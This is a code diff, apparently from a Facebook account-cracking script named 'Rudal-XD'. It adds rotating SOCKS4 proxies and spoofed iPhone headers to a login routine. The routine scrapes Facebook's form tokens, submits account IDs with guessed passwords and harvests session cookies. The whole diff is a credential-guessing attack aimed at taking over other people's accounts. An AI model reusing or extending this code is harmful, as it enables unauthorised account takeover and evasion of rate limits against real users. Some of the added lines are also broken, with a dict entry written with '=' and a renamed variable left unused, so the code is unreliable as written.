@@ -994,6 +994,7 @@ def passwrd():
 		exit()
 def methodnew(idf,pwv):
 	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
 	rr=random.randint
 	auth1='Rudal-XD'
 	ses=requests.Session()
@@ -1026,9 +1027,19 @@ def methodnew(idf,pwv):
 				'accept-encoding': 'gzip, deflate, br',
 				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 			}
+
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			ses.headers.update({'Host': 'iphone.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://iphone.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fiphone.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dab649465-fbff-4ead-bd68-1de3ab7f9dcf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			req = bs(r.get(url,headers=hdg,allow_redirects=True).content,'html.parser'); raq = req.find('form',{'method':'post'})
-			data ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
+			requ = bs(r.get(url,headers=hdg,allow_redirects=True).content,'html.parser'); raq = req.find('form',{'method':'post'})
+			data ={
+				"lsd":re.search('name="lsd" type="hidden" value="(.*?)"',str(requ)).group(1),
+				"jazoest":re.search('name="jazoest" type="hidden" value="(.*?)"',str(requ)).group(1),
+				"uid":idf,
+				"next" = "https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",
+				"flow":"login_no_pin",
+				"pass":pw,}
 			cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			cookieeee= requests.Session().cookies.get_dict()
